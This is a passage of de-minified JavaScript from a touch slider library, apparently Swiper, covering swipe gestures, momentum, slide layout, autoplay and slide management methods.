                    y.positions.current = (y.touches.current - y.touches.start) * b.touchRatio + y.positions.start,
                    0 < y.positions.current && b.onResistanceBefore && y.fireCallback(b.onResistanceBefore, y, y.positions.current),
                    y.positions.current < -m() && b.onResistanceAfter && y.fireCallback(b.onResistanceAfter, y, Math.abs(y.positions.current + m())),
                    b.resistance && "100%" !== b.resistance && (0 < y.positions.current && (t = 1 - y.positions.current / k / 2,
                    y.positions.current = t < .5 ? k / 2 : y.positions.current * t),
                    y.positions.current < -m() && (i = (y.touches.current - y.touches.start) * b.touchRatio + (m() + y.positions.start),
                    t = (k + i) / k,
                    n = y.positions.current - i * (1 - t) / 2,
                    i = -m() - k / 2,
                    y.positions.current = n < i || t <= 0 ? i : n)),
                    b.resistance && "100%" === b.resistance && (0 < y.positions.current && (!b.freeMode || b.freeModeFluid) && (y.positions.current = 0),
                    y.positions.current < -m() && (!b.freeMode || b.freeModeFluid) && (y.positions.current = -m())),
                    b.followFinger) {
                        if (b.moveStartThreshold)
                            if (Math.abs(y.touches.current - y.touches.start) > b.moveStartThreshold || E) {
                                if (!E)
                                    return E = !0,
                                    void (y.touches.start = y.touches.current);
                                y.setWrapperTranslate(y.positions.current)
                            } else
                                y.positions.current = y.positions.start;
                        else
                            y.setWrapperTranslate(y.positions.current);
                        return (b.freeMode || b.watchActiveIndex) && y.updateActiveSlide(y.positions.current),
                        b.grabCursor && (y.container.style.cursor = "move",
                        y.container.style.cursor = "grabbing",
                        y.container.style.cursor = "-moz-grabbin",
                        y.container.style.cursor = "-webkit-grabbing"),
                        j = j || y.touches.current,
                        I = I || (new Date).getTime(),
                        y.velocity = (y.touches.current - j) / ((new Date).getTime() - I) / 2,
                        Math.abs(y.touches.current - j) < 2 && (y.velocity = 0),
                        j = y.touches.current,
                        I = (new Date).getTime(),
                        y.callPlugins("onTouchMoveEnd"),
                        b.onTouchMove && y.fireCallback(b.onTouchMove, y, e),
                        !1
                    }
            }
        }
    }
    function p(e) {
        if (v && y.swipeReset(),
        !b.onlyExternal && y.isTouched) {
            y.isTouched = !1,
            b.grabCursor && (y.container.style.cursor = "move",
            y.container.style.cursor = "grab",
            y.container.style.cursor = "-moz-grab",
            y.container.style.cursor = "-webkit-grab"),
            y.positions.current || 0 === y.positions.current || (y.positions.current = y.positions.start),
            b.followFinger && y.setWrapperTranslate(y.positions.current),
            y.times.end = (new Date).getTime(),
            y.touches.diff = y.touches.current - y.touches.start,
            y.touches.abs = Math.abs(y.touches.diff),
            y.positions.diff = y.positions.current - y.positions.start,
            y.positions.abs = Math.abs(y.positions.diff);
            var t, i, n, a, o, s = y.positions.diff, r = y.positions.abs, c = y.times.end - y.times.start, l = (r < 5 && c < 300 && !1 === y.allowLinks && (b.freeMode || 0 === r || y.swipeReset(),
            b.preventLinks && (y.allowLinks = !0),
            b.onSlideClick && (y.allowSlideClick = !0)),
            setTimeout(function() {
                null != y && (b.preventLinks && (y.allowLinks = !0),
                b.onSlideClick && (y.allowSlideClick = !0))
            }, 100),
            m());
            if (!y.isMoved && b.freeMode)
                y.isMoved = !1,
                b.onTouchEnd && y.fireCallback(b.onTouchEnd, y, e),
                y.callPlugins("onTouchEnd");
            else if (!y.isMoved || 0 < y.positions.current || y.positions.current < -l)
                y.swipeReset(),
                b.onTouchEnd && y.fireCallback(b.onTouchEnd, y, e),
                y.callPlugins("onTouchEnd");
            else if (y.isMoved = !1,
            b.freeMode)
                b.freeModeFluid && (i = 1e3 * b.momentumRatio,
                n = y.velocity * i,
                n = y.positions.current + n,
                a = !1,
                o = 20 * Math.abs(y.velocity) * b.momentumBounceRatio,
                n < -l && (b.momentumBounce && y.support.transitions ? (n + l < -o && (n = -l - o),
                t = -l,
                R = a = !0) : n = -l),
                0 < n && (b.momentumBounce && y.support.transitions ? (o < n && (n = o),
                R = a = !(t = 0)) : n = 0),
                0 !== y.velocity && (i = Math.abs((n - y.positions.current) / y.velocity)),
                y.setWrapperTranslate(n),
                y.setWrapperTransition(i),
                b.momentumBounce && a && y.wrapperTransitionEnd(function() {
                    R && (b.onMomentumBounce && y.fireCallback(b.onMomentumBounce, y),
                    y.callPlugins("onMomentumBounce"),
                    y.setWrapperTranslate(t),
                    y.setWrapperTransition(300))
                }),
                y.updateActiveSlide(n)),
                (!b.freeModeFluid || 300 <= c) && y.updateActiveSlide(y.positions.current),
                b.onTouchEnd && y.fireCallback(b.onTouchEnd, y, e),
                y.callPlugins("onTouchEnd");
            else {
                "toNext" == (g = s < 0 ? "toNext" : "toPrev") && c <= 300 && (r < 30 || !b.shortSwipes ? y.swipeReset() : y.swipeNext(!0, !0)),
                "toPrev" == g && c <= 300 && (r < 30 || !b.shortSwipes ? y.swipeReset() : y.swipePrev(!0, !0));
                var d = 0;
                if ("auto" === b.slidesPerView) {
                    for (var p, u = Math.abs(y.getWrapperTranslate()), h = 0, f = 0; f < y.slides.length; f++)
                        if (u < (h += p = C ? y.slides[f].getWidth(!0, b.roundLengths) : y.slides[f].getHeight(!0, b.roundLengths))) {
                            d = p;
                            break
                        }
                    k < d && (d = k)
                } else
                    d = $ * b.slidesPerView;
                "toNext" == g && 300 < c && (r >= d * b.longSwipesRatio ? y.swipeNext(!0, !0) : y.swipeReset()),
                "toPrev" == g && 300 < c && (r >= d * b.longSwipesRatio ? y.swipePrev(!0, !0) : y.swipeReset()),
                b.onTouchEnd && y.fireCallback(b.onTouchEnd, y, e),
                y.callPlugins("onTouchEnd")
            }
        }
    }
    function n(e, t) {
        return e && e.getAttribute("class") && -1 < e.getAttribute("class").indexOf(t)
    }
    function F(e, t) {
        var i = document.createElement("div");
        return i.innerHTML = t,
        (t = i.firstChild).className += " " + e,
        t.outerHTML
    }
    function o(i, n, a) {
        var e = ("to" === n && 0 <= a.speed ? a : b).speed
          , o = +new Date;
        if (y.support.transitions || !b.DOMAnimation)
            y.setWrapperTranslate(i),
            y.setWrapperTransition(e);
        else {
            var s = y.getWrapperTranslate()
              , r = Math.ceil((i - s) / e * (1e3 / 60))
              , c = i < s ? "toNext" : "toPrev";
            if (y._DOMAnimating)
                return;
            !function e() {
                var t = +new Date;
                s += r * (t - o) / (1e3 / 60),
                ("toNext" == c ? i < s : s < i) ? (y.setWrapperTranslate(Math.ceil(s)),
                y._DOMAnimating = !0,
                window.setTimeout(function() {
                    e()
                }, 1e3 / 60)) : (!b.onSlideChangeEnd || "to" === n && !0 !== a.runCallbacks || y.fireCallback(b.onSlideChangeEnd, y, c),
                y.setWrapperTranslate(i),
                y._DOMAnimating = !1)
            }()
        }
        if (y.updateActiveSlide(i),
        b.onSlideNext && "next" === n && !0 === a.runCallbacks && y.fireCallback(b.onSlideNext, y, i),
        b.onSlidePrev && "prev" === n && !0 === a.runCallbacks && y.fireCallback(b.onSlidePrev, y, i),
        b.onSlideReset && "reset" === n && !0 === a.runCallbacks && y.fireCallback(b.onSlideReset, y, i),
        ("next" === n || "prev" === n || "to" === n) && !0 === a.runCallbacks) {
            var t = n;
            if (y.callPlugins("onSlideChangeStart"),
            b.onSlideChangeStart)
                if (b.queueStartCallbacks && y.support.transitions) {
                    if (y._queueStartCallbacks)
                        return;
                    y._queueStartCallbacks = !0,
                    y.fireCallback(b.onSlideChangeStart, y, t),
                    y.wrapperTransitionEnd(function() {
                        y._queueStartCallbacks = !1
                    })
                } else
                    y.fireCallback(b.onSlideChangeStart, y, t);
            b.onSlideChangeEnd && (y.support.transitions ? b.queueEndCallbacks ? y._queueEndCallbacks || (y._queueEndCallbacks = !0,
            y.wrapperTransitionEnd(function(e) {
                y.fireCallback(b.onSlideChangeEnd, e, t)
            })) : y.wrapperTransitionEnd(function(e) {
                y.fireCallback(b.onSlideChangeEnd, e, t)
            }) : b.DOMAnimation || setTimeout(function() {
                y.fireCallback(b.onSlideChangeEnd, y, t)
            }, 10))
        }
    }
    function q() {
        var e = y.paginationButtons;
        if (e)
            for (var t = 0; t < e.length; t++)
                y.h.removeEventListener(e[t], "click", V)
    }
    function V(e) {
        for (var t, i = e.target || e.srcElement, n = y.paginationButtons, a = 0; a < n.length; a++)
            i === n[a] && (t = a);
        b.autoplay && y.stopAutoplay(!0),
        y.swipeTo(t)
    }
    function t() {
        z = setTimeout(function() {
            b.loop ? (y.fixLoop(),
            y.swipeNext(!0, !0)) : y.swipeNext(!0, !0) || (b.autoplayStopOnLast ? (clearTimeout(z),
            z = void 0) : y.swipeTo(0)),
            y.wrapperTransitionEnd(function() {
                void 0 !== z && t()
            })
        }, b.autoplay)
    }
    if (document.body.outerHTML || !document.body.__defineGetter__ || !HTMLElement || (w = HTMLElement.prototype).__defineGetter__ && w.__defineGetter__("outerHTML", function() {
        return (new XMLSerializer).serializeToString(this)
    }),
    window.getComputedStyle || (window.getComputedStyle = function(i) {
        return this.el = i,
        this.getPropertyValue = function(e) {
            var t = /(\-([a-z]){1})/g;
            return t.test(e = "float" === e ? "styleFloat" : e) && (e = e.replace(t, function() {
                return arguments[2].toUpperCase()
            })),
            i.currentStyle[e] || null
        }
        ,
        this
    }
    ),
    Array.prototype.indexOf || (Array.prototype.indexOf = function(e, t) {
        for (var i = t || 0, n = this.length; i < n; i++)
            if (this[i] === e)
                return i;
        return -1
    }
    ),
    (document.querySelectorAll || window.jQuery) && void 0 !== e && (e.nodeType || 0 !== r(e).length)) {
        var y = this;
        y.touches = {
            start: 0,
            startX: 0,
            startY: 0,
            current: 0,
            currentX: 0,
            currentY: 0,
            diff: 0,
            abs: 0
        },
        y.positions = {
            start: 0,
            abs: 0,
            diff: 0,
            current: 0
        },
        y.times = {
            start: 0,
            end: 0
        },
        y.id = (new Date).getTime(),
        y.container = e.nodeType ? e : r(e)[0],
        y.isTouched = !1,
        y.isMoved = !1,
        y.activeIndex = 0,
        y.centerIndex = 0,
        y.activeLoaderIndex = 0,
        y.activeLoopIndex = 0,
        y.previousIndex = null,
        y.velocity = 0,
        y.snapGrid = [],
        y.slidesGrid = [],
        y.imagesToLoad = [],
        y.imagesLoaded = 0,
        y.wrapperLeft = 0,
        y.wrapperRight = 0,
        y.wrapperTop = 0,
        y.wrapperBottom = 0,
        y.isAndroid = 0 <= navigator.userAgent.toLowerCase().indexOf("android");
        var u, $, x, g, v, k, i, h = {
            eventTarget: "wrapper",
            mode: "horizontal",
            touchRatio: 1,
            speed: 300,
            freeMode: !1,
            freeModeFluid: !1,
            momentumRatio: 1,
            momentumBounce: !0,
            momentumBounceRatio: 1,
            slidesPerView: 1,
            slidesPerGroup: 1,
            slidesPerViewFit: !0,
            simulateTouch: !0,
            followFinger: !0,
            shortSwipes: !0,
            longSwipesRatio: .5,
            moveStartThreshold: !1,
            onlyExternal: !1,
            createPagination: !0,
            pagination: !1,
            paginationElement: "span",
            paginationClickable: !1,
            paginationAsRange: !0,
            resistance: !0,
            scrollContainer: !1,
            preventLinks: !0,
            preventLinksPropagation: !1,
            noSwiping: !1,
            noSwipingClass: "swiper-no-swiping",
            initialSlide: 0,
            keyboardControl: !1,
            mousewheelControl: !1,
            mousewheelControlForceToAxis: !1,
            useCSS3Transforms: !0,
            autoplay: !1,
            autoplayDisableOnInteraction: !0,
            autoplayStopOnLast: !1,
            loop: !1,
            loopAdditionalSlides: 0,
            roundLengths: !1,
            calculateHeight: !1,
            cssWidthAndHeight: !1,
            updateOnImagesReady: !0,
            releaseFormElements: !0,
            watchActiveIndex: !1,
            visibilityFullFit: !1,
            offsetPxBefore: 0,
            offsetPxAfter: 0,
            offsetSlidesBefore: 0,
            offsetSlidesAfter: 0,
            centeredSlides: !1,
            queueStartCallbacks: !1,
            queueEndCallbacks: !1,
            autoResize: !0,
            resizeReInit: !1,
            DOMAnimation: !0,
            loader: {
                slides: [],
                slidesHTMLType: "inner",
                surroundGroups: 1,
                logic: "reload",
                loadAllSlides: !1
            },
            swipeToPrev: !0,
            swipeToNext: !0,
            slideElement: "div",
            slideClass: "swiper-slide",
            slideActiveClass: "swiper-slide-active",
            slideVisibleClass: "swiper-slide-visible",
            slideDuplicateClass: "swiper-slide-duplicate",
            wrapperClass: "swiper-wrapper",
            paginationElementClass: "swiper-pagination-switch",
            paginationActiveClass: "swiper-active-switch",
            paginationVisibleClass: "swiper-visible-switch"
        };
        for (i in b = b || {},
        h)
            if (i in b && "object" == typeof b[i])
                for (var f in h[i])
                    f in b[i] || (b[i][f] = h[i][f]);
            else
                i in b || (b[i] = h[i]);
        (y.params = b).scrollContainer && (b.freeMode = !0,
        b.freeModeFluid = !0),
        b.loop && (b.resistance = "100%");
        var C = "horizontal" === b.mode
          , w = ["mousedown", "mousemove", "mouseup"];
        y.browser.ie10 && (w = ["MSPointerDown", "MSPointerMove", "MSPointerUp"]),
        y.browser.ie11 && (w = ["pointerdown", "pointermove", "pointerup"]),
        y.touchEvents = {
            touchStart: y.support.touch || !b.simulateTouch ? "touchstart" : w[0],
            touchMove: y.support.touch || !b.simulateTouch ? "touchmove" : w[1],
            touchEnd: y.support.touch || !b.simulateTouch ? "touchend" : w[2]
        };
        for (var T = y.container.childNodes.length - 1; 0 <= T; T--)
            if (y.container.childNodes[T].className)
                for (var H = y.container.childNodes[T].className.split(/\s+/), _ = 0; _ < H.length; _++)
                    H[_] === b.wrapperClass && (u = y.container.childNodes[T]);
        y.wrapper = u,
        y._extendSwiperSlide = function(i) {
            return i.append = function() {
                return b.loop ? i.insertAfter(y.slides.length - y.loopedSlides) : (y.wrapper.appendChild(i),
                y.reInit()),
                i
            }
            ,
            i.prepend = function() {
                return b.loop ? (y.wrapper.insertBefore(i, y.slides[y.loopedSlides]),
                y.removeLoopedSlides(),
                y.calcSlides(),
                y.createLoop()) : y.wrapper.insertBefore(i, y.wrapper.firstChild),
                y.reInit(),
                i
            }
            ,
            i.insertAfter = function(e) {
                return void 0 !== e && (b.loop ? ((t = y.slides[e + 1 + y.loopedSlides]) ? y.wrapper.insertBefore(i, t) : y.wrapper.appendChild(i),
                y.removeLoopedSlides(),
                y.calcSlides(),
                y.createLoop()) : (t = y.slides[e + 1],
                y.wrapper.insertBefore(i, t)),
                y.reInit(),
                i);
                var t
            }
            ,
            i.clone = function() {
                return y._extendSwiperSlide(i.cloneNode(!0))
            }
            ,
            i.remove = function() {
                y.wrapper.removeChild(i),
                y.reInit()
            }
            ,
            i.html = function(e) {
                return void 0 === e ? i.innerHTML : (i.innerHTML = e,
                i)
            }
            ,
            i.index = function() {
                for (var e, t = y.slides.length - 1; 0 <= t; t--)
                    i === y.slides[t] && (e = t);
                return e
            }
            ,
            i.isActive = function() {
                return i.index() === y.activeIndex
            }
            ,
            i.swiperSlideDataStorage || (i.swiperSlideDataStorage = {}),
            i.getData = function(e) {
                return i.swiperSlideDataStorage[e]
            }
            ,
            i.setData = function(e, t) {
                return i.swiperSlideDataStorage[e] = t,
                i
            }
            ,
            i.data = function(e, t) {
                return void 0 === t ? i.getAttribute("data-" + e) : (i.setAttribute("data-" + e, t),
                i)
            }
            ,
            i.getWidth = function(e, t) {
                return y.h.getWidth(i, e, t)
            }
            ,
            i.getHeight = function(e, t) {
                return y.h.getHeight(i, e, t)
            }
            ,
            i.getOffset = function() {
                return y.h.getOffset(i)
            }
            ,
            i
        }
        ,
        y.calcSlides = function(e) {
            var t = !!y.slides && y.slides.length;
            y.slides = [],
            y.displaySlides = [];
            for (var i = 0; i < y.wrapper.childNodes.length; i++)
                if (y.wrapper.childNodes[i].className)
                    for (var n = y.wrapper.childNodes[i].className.split(/\s+/), a = 0; a < n.length; a++)
                        n[a] === b.slideClass && y.slides.push(y.wrapper.childNodes[i]);
            for (i = y.slides.length - 1; 0 <= i; i--)
                y._extendSwiperSlide(y.slides[i]);
            !1 === t || t === y.slides.length && !e || (U(),
            A(),
            y.updateActiveSlide(),
            y.params.pagination && y.createPagination(),
            y.callPlugins("numberOfSlidesChanged"))
        }
        ,
        y.createSlide = function(e, t, i) {
            t = t || y.params.slideClass,
            i = i || b.slideElement;
            i = document.createElement(i);
            return i.innerHTML = e || "",
            i.className = t,
            y._extendSwiperSlide(i)
        }
        ,
        y.appendSlide = function(e, t, i) {
            return e ? (e.nodeType ? y._extendSwiperSlide(e) : y.createSlide(e, t, i)).append() : void 0
        }
        ,
        y.prependSlide = function(e, t, i) {
            return e ? (e.nodeType ? y._extendSwiperSlide(e) : y.createSlide(e, t, i)).prepend() : void 0
        }
        ,
        y.insertSlideAfter = function(e, t, i, n) {
            return void 0 !== e && (t.nodeType ? y._extendSwiperSlide(t) : y.createSlide(t, i, n)).insertAfter(e)
        }
        ,
        y.removeSlide = function(e) {
            if (y.slides[e]) {
                if (b.loop) {
                    if (!y.slides[e + y.loopedSlides])
                        return !1;
                    y.slides[e + y.loopedSlides].remove(),
                    y.removeLoopedSlides(),
                    y.calcSlides(),
                    y.createLoop()
                } else
                    y.slides[e].remove();
                return !0
            }
            return !1
        }
        ,
        y.removeLastSlide = function() {
            return 0 < y.slides.length && (b.loop ? (y.slides[y.slides.length - 1 - y.loopedSlides].remove(),
            y.removeLoopedSlides(),
            y.calcSlides(),
            y.createLoop()) : y.slides[y.slides.length - 1].remove(),
            !0)
        }
        ,
        y.removeAllSlides = function() {
            for (var e = y.slides.length, t = y.slides.length - 1; 0 <= t; t--)
                y.slides[t].remove(),
                t === e - 1 && y.setWrapperTranslate(0)
        }
        ,
        y.getSlide = function(e) {
            return y.slides[e]
        }
        ,
        y.getLastSlide = function() {
            return y.slides[y.slides.length - 1]
        }
        ,
        y.getFirstSlide = function() {
            return y.slides[0]
        }
        ,
        y.activeSlide = function() {
            return y.slides[y.activeIndex]
        }
        ,
        y.fireCallback = function() {
            var e = arguments[0];
            if ("[object Array]" === Object.prototype.toString.call(e))
                for (var t = 0; t < e.length; t++)
                    "function" == typeof e[t] && e[t](arguments[1], arguments[2], arguments[3], arguments[4], arguments[5]);
            else
                "[object String]" === Object.prototype.toString.call(e) ? b["on" + e] && y.fireCallback(b["on" + e], arguments[1], arguments[2], arguments[3], arguments[4], arguments[5]) : e(arguments[1], arguments[2], arguments[3], arguments[4], arguments[5])
        }
        ,
        y.addCallback = function(e, t) {
            var i;
            return this.params["on" + e] ? (i = this.params["on" + e],
            "[object Array]" === Object.prototype.toString.apply(i) ? this.params["on" + e].push(t) : "function" == typeof this.params["on" + e] ? (i = this.params["on" + e],
            this.params["on" + e] = [],
            this.params["on" + e].push(i),
            this.params["on" + e].push(t)) : void 0) : (this.params["on" + e] = [],
            this.params["on" + e].push(t))
        }
        ,
        y.removeCallbacks = function(e) {
            y.params["on" + e] && (y.params["on" + e] = null)
        }
        ;
        var S, W, D = [];
        for (S in y.plugins)
            !b[S] || (W = y.plugins[S](y, b[S])) && D.push(W);
        y.callPlugins = function(e, t) {
            t = t || {};
            for (var i = 0; i < D.length; i++)
                e in D[i] && D[i][e](t)
        }
        ,
        !y.browser.ie10 && !y.browser.ie11 || b.onlyExternal || y.wrapper.classList.add("swiper-wp8-" + (C ? "horizontal" : "vertical")),
        b.freeMode && (y.container.className += " swiper-free-mode"),
        y.initialized = !1,
        y.init = function(e, t) {
            var i = y.h.getWidth(y.container, !1, b.roundLengths)
              , n = y.h.getHeight(y.container, !1, b.roundLengths);
            if (i !== y.width || n !== y.height || e) {
                y.width = i,
                y.height = n,
                k = C ? i : n;
                var a, o, s, r, c, l, d, i = y.wrapper;
                if (e && y.calcSlides(t),
                "auto" === b.slidesPerView) {
                    var p = 0
                      , u = 0
                      , h = (0 < b.slidesOffset && (i.style.paddingLeft = "",
                    i.style.paddingRight = "",
                    i.style.paddingTop = "",
                    i.style.paddingBottom = ""),
                    i.style.width = "",
                    i.style.height = "",
                    0 < b.offsetPxBefore && (C ? y.wrapperLeft = b.offsetPxBefore : y.wrapperTop = b.offsetPxBefore),
                    0 < b.offsetPxAfter && (C ? y.wrapperRight = b.offsetPxAfter : y.wrapperBottom = b.offsetPxAfter),
                    b.centeredSlides && (C ? (y.wrapperLeft = (k - this.slides[0].getWidth(!0, b.roundLengths)) / 2,
                    y.wrapperRight = (k - y.slides[y.slides.length - 1].getWidth(!0, b.roundLengths)) / 2) : (y.wrapperTop = (k - y.slides[0].getHeight(!0, b.roundLengths)) / 2,
                    y.wrapperBottom = (k - y.slides[y.slides.length - 1].getHeight(!0, b.roundLengths)) / 2)),
                    C ? (0 <= y.wrapperLeft && (i.style.paddingLeft = y.wrapperLeft + "px"),
                    0 <= y.wrapperRight && (i.style.paddingRight = y.wrapperRight + "px")) : (0 <= y.wrapperTop && (i.style.paddingTop = y.wrapperTop + "px"),
                    0 <= y.wrapperBottom && (i.style.paddingBottom = y.wrapperBottom + "px")),
                    l = 0);
                    for (y.snapGrid = [],
                    y.slidesGrid = [],
                    d = s = 0; d < y.slides.length; d++) {
                        a = y.slides[d].getWidth(!0, b.roundLengths),
                        o = y.slides[d].getHeight(!0, b.roundLengths),
                        b.calculateHeight && (s = Math.max(s, o));
                        var f = C ? a : o;
                        if (b.centeredSlides) {
                            var m = d === y.slides.length - 1 ? 0 : y.slides[d + 1].getWidth(!0, b.roundLengths)
                              , g = d === y.slides.length - 1 ? 0 : y.slides[d + 1].getHeight(!0, b.roundLengths)
                              , m = C ? m : g;
                            if (k < f) {
                                if (b.slidesPerViewFit)
                                    y.snapGrid.push(l + y.wrapperLeft),
                                    y.snapGrid.push(l + f - k + y.wrapperLeft);
                                else
                                    for (var v = 0; v <= Math.floor(f / (k + y.wrapperLeft)); v++)
                                        y.snapGrid.push(0 === v ? l + y.wrapperLeft : l + y.wrapperLeft + k * v);
                                y.slidesGrid.push(l + y.wrapperLeft)
                            } else
                                y.snapGrid.push(h),
                                y.slidesGrid.push(h);
                            h += f / 2 + m / 2
                        } else {
                            if (k < f)
                                if (b.slidesPerViewFit)
                                    y.snapGrid.push(l),
                                    y.snapGrid.push(l + f - k);
                                else if (0 !== k)
                                    for (var w = 0; w <= Math.floor(f / k); w++)
                                        y.snapGrid.push(l + k * w);
                                else
                                    y.snapGrid.push(l);
                            else
                                y.snapGrid.push(l);
                            y.slidesGrid.push(l)
                        }
                        l += f,
                        p += a,
                        u += o
                    }
                    b.calculateHeight && (y.height = s),
                    C ? (x = p + y.wrapperRight + y.wrapperLeft,
                    b.cssWidthAndHeight && "height" !== b.cssWidthAndHeight || (i.style.width = p + "px"),
                    b.cssWidthAndHeight && "width" !== b.cssWidthAndHeight || (i.style.height = y.height + "px")) : (b.cssWidthAndHeight && "height" !== b.cssWidthAndHeight || (i.style.width = y.width + "px"),
                    b.cssWidthAndHeight && "width" !== b.cssWidthAndHeight || (i.style.height = u + "px"),
                    x = u + y.wrapperTop + y.wrapperBottom)
                } else if (b.scrollContainer)
                    i.style.width = "",
                    i.style.height = "",
                    r = y.slides[0].getWidth(!0, b.roundLengths),
                    c = y.slides[0].getHeight(!0, b.roundLengths),
                    x = C ? r : c,
                    i.style.width = r + "px",
                    i.style.height = c + "px",
                    $ = C ? r : c;
                else {
                    if (b.calculateHeight) {
                        for (c = s = 0,
                        C || (y.container.style.height = ""),
                        i.style.height = "",
                        d = 0; d < y.slides.length; d++)
                            y.slides[d].style.height = "",
                            s = Math.max(y.slides[d].getHeight(!0), s),
                            C || (c += y.slides[d].getHeight(!0));
                        o = s,
                        y.height = o,
                        C ? c = o : (k = o,
                        y.container.style.height = k + "px")
                    } else
                        o = C ? y.height : y.height / b.slidesPerView,
                        b.roundLengths && (o = Math.ceil(o)),
                        c = C ? y.height : y.slides.length * o;
                    for (a = C ? y.width / b.slidesPerView : y.width,
                    b.roundLengths && (a = Math.ceil(a)),
                    r = C ? y.slides.length * a : y.width,
                    $ = C ? a : o,
                    0 < b.offsetSlidesBefore && (C ? y.wrapperLeft = $ * b.offsetSlidesBefore : y.wrapperTop = $ * b.offsetSlidesBefore),
                    0 < b.offsetSlidesAfter && (C ? y.wrapperRight = $ * b.offsetSlidesAfter : y.wrapperBottom = $ * b.offsetSlidesAfter),
                    0 < b.offsetPxBefore && (C ? y.wrapperLeft = b.offsetPxBefore : y.wrapperTop = b.offsetPxBefore),
                    0 < b.offsetPxAfter && (C ? y.wrapperRight = b.offsetPxAfter : y.wrapperBottom = b.offsetPxAfter),
                    b.centeredSlides && (C ? (y.wrapperLeft = (k - $) / 2,
                    y.wrapperRight = (k - $) / 2) : (y.wrapperTop = (k - $) / 2,
                    y.wrapperBottom = (k - $) / 2)),
                    C ? (0 < y.wrapperLeft && (i.style.paddingLeft = y.wrapperLeft + "px"),
                    0 < y.wrapperRight && (i.style.paddingRight = y.wrapperRight + "px")) : (0 < y.wrapperTop && (i.style.paddingTop = y.wrapperTop + "px"),
                    0 < y.wrapperBottom && (i.style.paddingBottom = y.wrapperBottom + "px")),
                    x = C ? r + y.wrapperRight + y.wrapperLeft : c + y.wrapperTop + y.wrapperBottom,
                    0 < parseFloat(r) && (!b.cssWidthAndHeight || "height" === b.cssWidthAndHeight) && (i.style.width = r + "px"),
                    0 < parseFloat(c) && (!b.cssWidthAndHeight || "width" === b.cssWidthAndHeight) && (i.style.height = c + "px"),
                    l = 0,
                    y.snapGrid = [],
                    y.slidesGrid = [],
                    d = 0; d < y.slides.length; d++)
                        y.snapGrid.push(l),
                        y.slidesGrid.push(l),
                        l += $,
                        0 < parseFloat(a) && (!b.cssWidthAndHeight || "height" === b.cssWidthAndHeight) && (y.slides[d].style.width = a + "px"),
                        0 < parseFloat(o) && (!b.cssWidthAndHeight || "width" === b.cssWidthAndHeight) && (y.slides[d].style.height = o + "px")
                }
                y.initialized ? (y.callPlugins("onInit"),
                b.onInit && y.fireCallback(b.onInit, y)) : (y.callPlugins("onFirstInit"),
                b.onFirstInit && y.fireCallback(b.onFirstInit, y)),
                y.initialized = !0
            }
        }
        ,
        y.reInit = function(e) {
            y.init(!0, e)
        }
        ,
        y.resizeFix = function(e) {
            y.callPlugins("beforeResizeFix"),
            y.init(b.resizeReInit || e),
            b.freeMode ? y.getWrapperTranslate() < -m() && (y.setWrapperTransition(0),
            y.setWrapperTranslate(-m())) : (y.swipeTo(b.loop ? y.activeLoopIndex : y.activeIndex, 0, !1),
            b.autoplay && (y.support.transitions && void 0 !== z ? void 0 !== z && (clearTimeout(z),
            z = void 0,
            y.startAutoplay()) : void 0 !== L && (clearInterval(L),
            L = void 0,
            y.startAutoplay()))),
            y.callPlugins("afterResizeFix")
        }
        ,
        y.destroy = function(e) {
            var t = y.h.removeEventListener
              , i = "wrapper" === b.eventTarget ? y.wrapper : y.container;
            if (y.browser.ie10 || y.browser.ie11 ? (t(i, y.touchEvents.touchStart, l),
            t(document, y.touchEvents.touchMove, d),
            t(document, y.touchEvents.touchEnd, p)) : (y.support.touch && (t(i, "touchstart", l),
            t(i, "touchmove", d),
            t(i, "touchend", p)),
            b.simulateTouch && (t(i, "mousedown", l),
            t(document, "mousemove", d),
            t(document, "mouseup", p))),
            b.autoResize && t(window, "resize", y.resizeFix),
            U(),
            b.paginationClickable && q(),
            b.mousewheelControl && y._wheelEvent && t(y.container, y._wheelEvent, c),
            b.keyboardControl && t(document, "keydown", s),
            b.autoplay && y.stopAutoplay(),
            e) {
                y.wrapper.removeAttribute("style");
                for (var n = 0; n < y.slides.length; n++)
                    y.slides[n].removeAttribute("style")
            }
            y.callPlugins("onDestroy"),
            window.jQuery && window.jQuery(y.container).data("swiper") && window.jQuery(y.container).removeData("swiper"),
            window.Zepto && window.Zepto(y.container).data("swiper") && window.Zepto(y.container).removeData("swiper"),
            y = null
        }
        ,
        y.disableKeyboardControl = function() {
            b.keyboardControl = !1,
            y.h.removeEventListener(document, "keydown", s)
        }
        ,
        y.enableKeyboardControl = function() {
            b.keyboardControl = !0,
            y.h.addEventListener(document, "keydown", s)
        }
        ;
        var J = (new Date).getTime();
        y.disableMousewheelControl = function() {
            return !!y._wheelEvent && (b.mousewheelControl = !1,
            y.h.removeEventListener(y.container, y._wheelEvent, c),
            !0)
        }
        ,
        y.enableMousewheelControl = function() {
            return !!y._wheelEvent && (b.mousewheelControl = !0,
            y.h.addEventListener(y.container, y._wheelEvent, c),
            !0)
        }
        ,
        b.grabCursor && ((e = y.container.style).cursor = "move",
        e.cursor = "grab",
        e.cursor = "-moz-grab",
        e.cursor = "-webkit-grab"),
        y.allowSlideClick = !0;
        var E, j, I, z, L, O = !(y.allowLinks = !0), R = !0;
        y.swipeNext = function(e, t) {
            void 0 === e && (e = !0),
            !t && b.loop && y.fixLoop(),
            !t && b.autoplay && y.stopAutoplay(!0),
            y.callPlugins("onSwipeNext");
            var i = y.getWrapperTranslate().toFixed(2)
              , n = i;
            if ("auto" === b.slidesPerView) {
                for (var a = 0; a < y.snapGrid.length; a++)
                    if (-i >= y.snapGrid[a].toFixed(2) && -i < y.snapGrid[a + 1].toFixed(2)) {
                        n = -y.snapGrid[a + 1];
                        break
                    }
            } else
                t = $ * b.slidesPerGroup,
                n = -(Math.floor(Math.abs(i) / Math.floor(t)) * t + t);
            return (n = n < -m() ? -m() : n) !== i && (o(n, "next", {
                runCallbacks: e
            }),
            !0)
        }
        ,
        y.swipePrev = function(e, t) {
            void 0 === e && (e = !0),
            !t && b.loop && y.fixLoop(),
            !t && b.autoplay && y.stopAutoplay(!0),
            y.callPlugins("onSwipePrev");
            var i = Math.ceil(y.getWrapperTranslate());
            if ("auto" === b.slidesPerView)
                for (var n = 0, a = 1; a < y.snapGrid.length; a++) {
                    if (-i === y.snapGrid[a]) {
                        n = -y.snapGrid[a - 1];
                        break
                    }
                    if (-i > y.snapGrid[a] && -i < y.snapGrid[a + 1]) {
                        n = -y.snapGrid[a];
                        break
                    }
                }
            else {
                t = $ * b.slidesPerGroup;
                n = -(Math.ceil(-i / t) - 1) * t
            }
            return (n = 0 < n ? 0 : n) !== i && (o(n, "prev", {
                runCallbacks: e
            }),
            !0)
        }
        ,
        y.swipeReset = function(e) {
            void 0 === e && (e = !0),
